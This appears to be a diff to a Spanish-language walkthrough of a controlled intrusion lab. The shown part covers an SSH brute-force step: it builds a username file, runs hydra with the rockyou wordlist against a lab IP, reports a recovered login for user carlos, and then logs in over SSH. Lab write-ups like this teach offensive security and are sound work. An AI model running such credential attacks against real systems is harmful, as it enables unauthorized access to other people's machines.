@@ -282,17 +282,38 @@ El propósito de este ejercicio es simular un entorno de intrusión controlada m
 ## 🛠️ Ataque por Fuerza Bruta (SSH)
 
 1. 🧾 **Crear archivo de usuarios**
+
+   Estos tres nombres probablemente representan usuarios del sistema, y uno de ellos podría tener:
+
+   - Acceso SSH (ssh sofia@172.20.10.2).
+   - Ser parte de un login web (si lo hubiera).
+   - Estar vinculado a archivos, flags o privilegios en el sistema.
+   
+   Para esto se crea un fichero de user.txt con el comando:
+   
    ```bash
-   echo -e "Sofia\nCarlos\nLuis" > user.txt
+   nano user.txt
    ```
 
-2. 🔓 **Ejecutar hydra**
+   <img width="777" height="144" alt="image" src="https://github.com/user-attachments/assets/830a6d75-b910-423a-8236-29f585156cd3" />
+
+3. 🔓 **Ejecutar hydra**
+
+   Se usa hydra para ataque por diccionario:
+
    ```bash
-   hydra -L user.txt -P /usr/share/wordlists/rockyou.txt ssh://172.20.10.2
+   hydra -L user.txt -P /usr/share/wordlists/rockyou.txt ssh://172.20.10.2 -t 4 -f -v
    ```
+
+   <img width="442" height="182" alt="image" src="https://github.com/user-attachments/assets/98d52e2d-9899-4c8c-8a0c-24c181f61e77" />
+
+   Se obtiene que:
+
+   <img width="441" height="48" alt="image" src="https://github.com/user-attachments/assets/83cbd6e0-c44a-466b-938d-d3ee33959639" />
+
    > Acceso válido: `carlos : [contraseña descubierta]`
 
-3. 🖥️ **Ingreso al sistema**
+5. 🖥️ **Ingreso al sistema**
    ```bash
    ssh carlos@172.20.10.2
    ```
